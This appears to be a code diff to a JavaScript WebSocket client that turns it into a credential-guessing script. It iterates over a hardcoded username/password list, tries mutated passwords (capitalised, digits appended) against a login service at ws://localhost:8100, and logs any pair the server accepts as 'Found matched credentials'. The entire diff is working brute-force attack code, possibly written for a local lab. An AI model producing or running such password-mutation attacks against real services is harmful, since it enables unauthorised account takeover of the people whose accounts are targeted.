@@ -24,40 +24,63 @@ const credentials = {
     "aaa": "aaa",
   };
 
+function capitalizeFirstLetter(password) {
+    return password.charAt(0).toUpperCase() + password.slice(1);
+}
+
 
 for (let username in credentials) {
-    class WebSocketClient {
-        constructor(url) {
-            this.url = url;
-            this.socket = new WebSocket(url);
-    
-            this.socket.on('open', () => {
-                console.log('WebSocket connection established.');
-            });
-    
-            this.socket.on('message', (data) => {
-                const message = JSON.parse(data);
-    
-                console.log('Message received from server:', message);
-                if (message.action === 'checkRegistration') {
-                    this.send({ action: 'login', username: username, password: credentials[username]});
-                }
-            });
-    
-            this.socket.on('close', () => {
-                console.log('WebSocket connection closed.');
-            });
-    
-            this.socket.on('error', (error) => {
-                console.error('WebSocket error:', error);
-            });
+    for (let i = -1; i <= 10; i++) {
+        class WebSocketClient {
+            constructor(url) {
+                this.url = url;
+                this.socket = new WebSocket(url);
+        
+                this.socket.on('open', () => {
+                    console.log('WebSocket connection established.');
+                });
+        
+                this.socket.on('message', (data) => {
+                    const message = JSON.parse(data);
+                    let password = credentials[username]
+                    console.log('Message received from server:', message);
+
+                    switch (i) {
+                        case -1:
+                            break;
+                        case 0:
+                            password = capitalizeFirstLetter(password)
+                            break;
+                        default:
+                            password += i
+                      }
+
+                    if (message.action === 'checkRegistration') {
+                        this.send({ action: 'login', username: username, password: password});
+                    }
+
+                    if (message.action === 'viewFeedAndUser') {
+                        console.log("Found matched credentials:")
+                        console.log(username)
+                        console.log(password)
+                    }
+                });
+        
+                this.socket.on('close', () => {
+                    console.log('WebSocket connection closed.');
+                });
+        
+                this.socket.on('error', (error) => {
+                    console.error('WebSocket error:', error);
+                });
+            }
+        
+            send(data) {
+                this.socket.send(JSON.stringify(data));
+                console.log('Message sent to server:', data);
+            }
         }
-    
-        send(data) {
-            this.socket.send(JSON.stringify(data));
-            console.log('Message sent to server:', data);
-        }
+        const client = new WebSocketClient('ws://localhost:8100'); 
     }
     
-    const client = new WebSocketClient('ws://localhost:8100'); 
 }
